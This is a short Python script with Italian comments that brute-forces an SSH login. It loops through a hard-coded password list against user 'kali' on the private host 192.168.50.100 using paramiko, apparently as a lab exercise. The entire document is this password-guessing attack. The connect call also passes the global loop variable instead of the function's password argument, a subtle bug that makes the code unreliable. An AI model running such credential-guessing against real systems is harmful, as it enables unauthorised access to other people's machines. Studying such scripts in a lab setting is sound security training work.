import paramiko #libreria per l'implementazione di SSH e stabilisce connessioni sicure

#funzione per il test di autenticazione
def test_authentication(username, hostname, password):
    #inizializzo client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())#impostiamo le policy

    try:
        client.connect(hostname=hostname, username=username, password=p) #connessione, se test_authentication è corretta stampa Authentication Successful
        print(f"Authentication successful: {username}:{password}")
        return True
    
    except paramiko.AuthenticationException:
        print(f"Authentication failed: {username}:{password}")#se non è corretta stampa Authentication failed
        return False
    
    finally:
        client.close()#chiusura connessione

passwords = ["password", "Agosto2025", "nonèpassword", "key", "kali", "mammamia"] #inizializzo la lista delle prove di password
#ciclo per le prove di password in lista fino ad autenticare quello giusto ossia kali
for p in passwords:
    if test_authentication("kali", "192.168.50.100", p):
        break